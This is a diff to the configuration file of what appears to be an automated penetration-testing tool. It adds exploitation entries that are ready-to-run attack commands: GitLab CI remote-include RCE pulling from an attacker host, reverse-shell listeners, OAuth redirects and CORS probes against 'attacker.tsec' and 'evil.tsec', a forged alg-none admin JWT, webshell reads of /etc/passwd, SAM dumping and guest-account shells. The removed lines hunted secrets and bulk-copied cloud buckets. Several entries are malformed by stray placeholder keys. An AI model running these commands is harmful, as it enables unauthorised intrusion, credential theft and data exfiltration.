+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'VCenter Path Fuzz'
+args = ['-u', 'https://{rhost}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302,403', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'ESXi API Unauth Probe'
+args = ['-sk', 'https://{rhost}/sdk']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.gitlab-rce'
+phase = 'exploitation'
+label = 'GITLAB RCE'
+summary = 'Exploit GitLab CI and import vectors for code execution'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab Users Probe'
+args = ['-sk', '{url}/api/v4/users']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab Version Probe'
+args = ['-sk', '{url}/api/v4/version']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab SSRF Import Probe'
+args = ['-sk', '{url}/api/v4/import/github']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab CI Lint RCE'
+args = ['-sk', '{url}/api/v4/ci/lint', '-d', '{"include":[{"remote":"http://{lhost}:8888/x.yml"}]}']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab Webhook SSRF Probe'
+args = ['-sk', '{url}/api/v4/projects/1/hooks', '-d', '{"url":"http://{lhost}:8888/hook"}']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'GitLab Template Sweep'
+args = ['-u', '{url}', '-tags', 'gitlab,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'gitleaks'
+[[capability.provider.operation]]
+name = 'GitLab Token Hunt'
+args = ['detect', '--source', '{url}/.git', '--report-format', 'json', '--report-path', '/tmp/gl.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider]]
+name_placeholder7 = true
+[[capability.provider.operation]]
+name = 'GitLab Snippet Exfil Probe'
+args = ['-sk', '{url}/api/v4/snippets/public']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'GitLab Callback Listener'
+args = ['-lvnp', '8888']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'GitLab Tech Confirm'
+args = ['-u', '{url}', '-tech-detect', '-title', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab Exploit Repo Pull'
+args = ['-sk', '{url}/api/v4/projects?simple=true']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'GitLab Service Sweep'
+args = ['-sV', '-p', '80,443,22,2224', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'GitLab Path Fuzz'
+args = ['-u', '{url}/api/v4/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt', '-mc', '200,401', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab Runner Registration Probe'
+args = ['-sk', '{url}/api/v4/runners/verify']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sslscan'
+[[capability.provider.operation]]
+name = 'GitLab TLS Audit'
+args = ['{url}:443']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.oauth-session-abuse'
+phase = 'exploitation'
+label = 'OAUTH SESSION ABUSE'
+summary = 'Exploit OAuth misconfigurations and session handling flaws'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'client-id', type = 'text', required = false, default = '' },
+  { key = 'redirect', type = 'url', required = false, default = 'https://attacker.tsec' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'OAuth Client Enum'
+args = ['-sk', '{url}/.well-known/openid-configuration']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Open Redirect via redirect_uri'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code} %{redirect_url}', '{url}/oauth/authorize?client_id={client-id}&redirect_uri={redirect}&response_type=code']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'PKCE Downgrade Probe'
+args = ['-sk', '{url}/oauth/authorize?client_id={client-id}&redirect_uri={redirect}&response_type=code&prompt=none']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'ID Token Confusion Probe'
+args = ['-sk', '{url}/oauth/token', '-d', 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'State Parameter Omission'
+args = ['-sk', '{url}/oauth/authorize?client_id={client-id}&redirect_uri={redirect}&response_type=token']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'OAuth Template Sweep'
+args = ['-u', '{url}', '-tags', 'oauth,sso', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Session Cookie Flags Audit'
+args = ['-skI', '{url}/login']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'JWT alg none Probe'
+args = ['-sk', '{url}/api/user', '-H', 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Token Replay Probe'
+args = ['-sk', '{url}/api/user', '-H', 'Authorization: Bearer {client-id}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'JWKS Key Injection Probe'
+args = ['-sk', '{url}/.well-known/jwks.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'IdP Tech Confirm'
+args = ['-u', '{url}', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'CORS Misconfig Probe'
+args = ['-sk', '{url}/api/user', '-H', 'Origin: https://evil.tsec']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'SAML Redirect Probe'
+args = ['-sk', '{url}/saml/login']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'OAuth Path Fuzz'
+args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Code Interception Replay'
+args = ['-sk', '{url}/oauth/token', '-d', 'code=replaycode&grant_type=authorization_code&redirect_uri={redirect}']
+output = 'json'
+network = true
+
+[[capability]]
+id = 'exploitation.public-cve-sweep'
+phase = 'exploitation'
+label = 'PUBLIC CVE SWEEP'
+summary = 'Sweep targets against high yield public CVE exploitation checks'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'list', type = 'file', required = false, default = '/tmp/urls.txt' },
+]
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'CVE 2024 Critical Sweep'
+args = ['-u', '{url}', '-tags', 'cve2024', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'CVE 2023 Critical Sweep'
+args = ['-u', '{url}', '-tags', 'cve2023', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'CVE 2022 Critical Sweep'
+args = ['-u', '{url}', '-tags', 'cve2022', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'CNCF/K8s CVE Sweep'
+args = ['-u', '{url}', '-tags', 'cve,kubernetes', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'VPN CVE Critical Sweep'
+args = ['-u', '{url}', '-tags', 'cve,vpn,fortinet,ivanti', '-severity', 'critical,high', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Manual RCE Echo Verify'
+args = ['-sk', '{url}', '-d', 'cmd=id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Tech Map Pre Exploit'
+args = ['-l', '{list}', '-tech-detect', '-title', '-sc', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Full List Critical Sweep'
+args = ['-l', '{list}', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Interactive Tags Sweep'
+args = ['-l', '{list}', '-tags', 'interactive,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider]]
+name_placeholder8 = true
+[[capability.provider.operation]]
+name = 'Vuln Script Full Sweep'
+args = ['-sV', '--script', 'vulners', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'CVE Circl Lookup'
+args = ['-sk', 'https://cve.circl.lu/api/last']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'High Sev Full List Sweep'
+args = ['-l', '{list}', '-severity', 'high', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Unknown Endpoint Sweep'
+args = ['-l', '{list}', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Out-of-Band Interactive Sweep'
+args = ['-l', '{list}', '-tags', 'oob,rce', '-silent', '-nc', '-interactsh-url']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Post Exploit Asset Confirm'
+args = ['-l', '{list}', '-title', '-sc', '-cl', '-silent', '-nc']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.idor-access-control'
+phase = 'exploitation'
+label = 'IDOR ACCESS CONTROL'
+summary = 'Exploit broken access control and IDOR for unauthorized data access'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'token', type = 'password', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Admin Endpoint Unauth Probe'
+args = ['-sk', '{url}/api/admin/users']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'IDOR Id Shift Probe'
+args = ['-sk', '{url}/api/users/2', '-H', 'Authorization: Bearer {token}']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'UUID Sequential Probe'
+args = ['-sk', '{url}/api/orders/1000', '-H', 'Authorization: Bearer {token}']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Method Override Bypass'
+args = ['-sk', '-X', 'POST', '{url}/api/users/2', '-H', 'X-HTTP-Method-Override: DELETE']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Path Confusion Bypass'
+args = ['-sk', '{url}/api/admin/../user/2']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Role Parameter Tamper'
+args = ['-sk', '{url}/api/profile', '-d', '{"role":"admin"}', '-H', 'Content-Type: application/json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'IDOR ID Fuzz'
+args = ['-u', '{url}/api/users/FUZZ', '-w', '/usr/share/seclists/Fuzzing/numbers.txt', '-mc', '200', '-t', '10']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Access Control Template Sweep'
+args = ['-u', '{url}', '-tags', 'unauth,exposure', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GraphQL Introspection Probe'
+args = ['-sk', '{url}/graphql', '-d', '{"query":"{__schema{types{name}}}"}']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GraphQL IDOR Probe'
+args = ['-sk', '{url}/graphql', '-d', '{"query":"{user(id:2){id email}}"}']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Swagger Unauth Probe'
+args = ['-sk', '{url}/swagger.json', '{url}/api-docs']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'API Surface Confirm'
+args = ['-u', '{url}', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Mass Assignment Probe'
+args = ['-sk', '{url}/api/register', '-d', '{"email":"x@x.tsec","password":"Passw0rd!","role":"admin"}', '-H', 'Content-Type: application/json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Verbose Error Info Leak'
+args = ['-sk', '{url}/api/users/abc']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'API Endpoint Fuzz'
+args = ['-u', '{url}/api/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt', '-mc', '200', '-t', '20']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.exploit-chain-verify'
+phase = 'exploitation'
+label = 'EXPLOIT CHAIN VERIFY'
+summary = 'Confirm exploitation success and capture proof of execution'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = false, default = '9001' },
+]
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Reverse Shell Listener'
+args = ['-lvnp', '{lport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Whoami Proof Capture'
+args = ['smb', '{rhost}', '-u', 'guest', '-p', '', '-x', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider]]
+name_placeholder9 = true
+[[capability.provider.operation]]
+name = 'Webshell Proof Capture'
+args = ['-sk', 'http://{rhost}/shell.php?cmd=whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Callback Traffic Confirm'
+args = ['-i', 'eth0', '-nn', '-c', '20', 'port', '{lport}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ss'
+[[capability.provider]]
+name_placeholder10 = true
+[[capability.provider.operation]]
+name = 'Listener Established Verify'
+args = ['-tlnp']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Injected Process Verify'
+args = ['aux']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Post Exploit SAM Check'
+args = ['smb', '{rhost}', '-u', 'guest', '-p', '', '--sam']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Chain Report Build'
+args = ['chain_report.py', '--rhost', '{rhost}', '--out', '/tmp/chain.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'impacket-psexec'
+[[capability.provider.operation]]
+name = 'Foothold Consolidation Shell'
+args = ['{rhost}/guest:']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'WinRM Foothold Shell'
+args = ['-i', '{rhost}', '-u', 'guest', '-p', '']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'SSH Foothold Shell'
+args = ['-o', 'StrictHostKeyChecking=no', 'guest@{rhost}', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Data Exfil Proof Fetch'
+args = ['-sk', 'http://{rhost}/shell.php?cmd=cat+/etc/passwd']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'file'
+[[capability.provider]]
+name_placeholder11 = true
+[[capability.provider.operation]]
+name = 'Exfil Artifact Verify'
+args = ['/tmp/chain.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
-name = 'Master Manifest'
-args = ['{directory}/image.dd']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'objectives.regex-matching'
-phase = 'objectives'
-label = 'REGEX MATCHING'
-summary = 'Match high-value patterns across the raw text corpus'
-inputs = [
-  { key = 'path', type = 'path', required = true },
-  { key = 'pattern', type = 'text', required = false, default = 'AKIA[0-9A-Z]+' },
-]
-[[capability.provider]]
-binary = 'rg'
-[[capability.provider.operation]]
-name = 'Pattern Hunt'
-args = ['-n', '-e', '{pattern}', '{path}']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'JWT Hunt'
-args = ['-n', '-e', 'eyJ', '{path}']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Private Key Blocks'
-args = ['-n', '-e', 'BEGIN RSA PRIVATE KEY', '{path}']
+name = 'Proof Hash Snapshot'
+args = ['/tmp/chain.json']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'pcregrep'
+binary = 'nmap'
 [[capability.provider.operation]]
-name = 'Multiline Scan'
-args = ['-M', '-r', '{pattern}', '{path}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'egrep'
-[[capability.provider.operation]]
-name = 'Email Scan'
-args = ['-r', '-o', '[a-z0-9._%+-]+@[a-z0-9.-]+', '{path}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'sed'
-[[capability.provider.operation]]
-name = 'Filter Matches'
-args = ['-n', '-E', '/{pattern}/p', '{path}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'awk'
-[[capability.provider.operation]]
-name = 'Format Matches'
-args = ['-f', 'format_matches.awk', '{path}']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'objectives.event-collection'
-phase = 'objectives'
-label = 'EVENT COLLECTION'
-summary = 'Collect system and audit events relevant to the objective'
-inputs = [
-  { key = 'unit', type = 'text', required = false, default = 'sshd' },
-  { key = 'since', type = 'text', required = false, default = '7 days ago' },
-  { key = 'directory', type = 'path', required = false, default = '/var/log/evidence' },
-]
-[[capability.provider]]
-binary = 'journalctl'
-[[capability.provider.operation]]
-name = 'Unit Export'
-args = ['-u', '{unit}', '--since', '{since}', '-o', 'json']
-output = 'json'
-network = true
-
-[[capability.provider.operation]]
-name = 'Previous Boot'
-args = ['-b', '-1', '--no-pager']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'wevtutil'
-[[capability.provider.operation]]
-name = 'Channel Export'
-args = ['epl', 'Security', '{directory}/security.evtx']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'ausearch'
-[[capability.provider.operation]]
-name = 'Audit Export'
-args = ['-m', 'EXECVE', '-ts', 'recent', '-o', 'raw']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'auditctl'
-[[capability.provider.operation]]
-name = 'Rule Listing'
-args = ['-l']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tar'
-[[capability.provider.operation]]
-name = 'Log Archive'
-args = ['-czf', '{directory}/logs.tar.gz', '/var/log']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'objectives.storage-harvesting'
-phase = 'objectives'
-label = 'STORAGE HARVESTING'
-summary = 'Harvest objective data from cloud object storage'
-inputs = [
-  { key = 'bucket', type = 'text', required = true },
-  { key = 'directory', type = 'path', required = false, default = '/tmp/harvest' },
-]
-[[capability.provider]]
-binary = 'aws'
-[[capability.provider.operation]]
-name = 'S3 Sync'
-args = ['s3', 'sync', 's3://{bucket}', '{directory}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'azcopy'
-[[capability.provider.operation]]
-name = 'Blob Sync'
-args = ['copy', 'https://{bucket}.blob.core.windows.net', '{directory}', '--recursive']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'gcloud'
-[[capability.provider.operation]]
-name = 'GCS Sync'
-args = ['storage', 'rsync', 'gs://{bucket}', '{directory}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'rclone'
-[[capability.provider.operation]]
-name = 'Universal Sync'
-args = ['copy', 'remote:{bucket}', '{directory}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 's3cmd'
-[[capability.provider.operation]]
-name = 'S3 Get'
-args = ['sync', 's3://{bucket}', '{directory}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'objectives.impact-correlation'
-phase = 'objectives'
-label = 'IMPACT CORRELATION'
-summary = 'Correlate harvested records into a measurable impact figure'
-inputs = [
-  { key = 'path', type = 'path', required = true },
-  { key = 'key', type = 'text', required = false, default = 'department' },
-]
-[[capability.provider]]
-binary = 'jq'
-[[capability.provider.operation]]
-name = 'Record Count'
-args = ['-r', '.[].{key}', '{path}/users.json']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'sqlite3'
-[[capability.provider.operation]]
-name = 'Exposure Query'
-args = ['/tmp/impact.db', '.read', 'impact_report.sql']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'datamash'
-[[capability.provider.operation]]
-name = 'Summary Stats'
-args = ['-g', '1', 'sum', '2', '{path}/metrics.tsv']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'sort'
-[[capability.provider.operation]]
-name = 'Frequency Sort'
-args = ['-nr', '{path}/frequencies.txt']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'awk'
-[[capability.provider.operation]]
-name = 'Top Domains'
-args = ['-f', 'top_domains.awk', '{path}/domains.txt']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'objectives.custody-chain'
-phase = 'objectives'
-label = 'CUSTODY CHAIN'
-summary = 'Sign and ledger every evidence transfer'
-inputs = [
-  { key = 'artifact', type = 'path', required = true },
-  { key = 'operator', type = 'text', required = true },
-  { key = 'log', type = 'file', required = false, default = 'custody.log' },
-]
-[[capability.provider]]
-binary = 'sha512sum'
-[[capability.provider.operation]]
-name = 'Digest'
-args = ['{artifact}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'openssl'
-[[capability.provider.operation]]
-name = 'Detached Signature'
-args = ['dgst', '-sha512', '-sign', '{operator}.key', '-out', '{artifact}.sig', '{artifact}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'gpg'
-[[capability.provider.operation]]
-name = 'Sign Manifest'
-args = ['--detach-sign', '--armor', '--local-user', '{operator}', '{log}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'ts'
-[[capability.provider.operation]]
-name = 'Timestamp'
-args = ['{log}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'git'
-[[capability.provider.operation]]
-name = 'Ledger Commit'
-args = ['-c', 'commit.gpgsign=true', 'commit', '-m', 'custody']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'objectives.objective-reporting'
-phase = 'objectives'
-label = 'OBJECTIVE REPORTING'
-summary = 'Report objective achievement and measured impact'
-inputs = [
-  { key = 'metrics', type = 'file', required = true },
-  { key = 'checklist', type = 'file', required = true },
-  { key = 'report', type = 'file', required = false, default = 'objective_report.md' },
-]
-[[capability.provider]]
-binary = 'python3'
-[[capability.provider.operation]]
-name = 'Metrics Build'
-args = ['report_metrics.py', '--input', '{metrics}', '--checklist', '{checklist}', '--out', '{report}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'wc'
-[[capability.provider.operation]]
-name = 'Record Volume'
-args = ['-l', '{metrics}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'du'
-[[capability.provider.operation]]
-name = 'Byte Volume'
-args = ['-sh', '/tmp/stage']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'pandoc'
-[[capability.provider.operation]]
-name = 'Report Render'
-args = ['{report}', '-o', 'objective_report.html']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'enscript'
-[[capability.provider.operation]]
-name = 'Evidence Format'
-args = ['-h', '-C', '-o', 'evidence.ps', 'evidence.txt']
+name = 'Post Exploit Service Diff'
+args = ['-sV', '--top-ports', '100', '{rhost}']
 output = 'lines'
 network = true
 
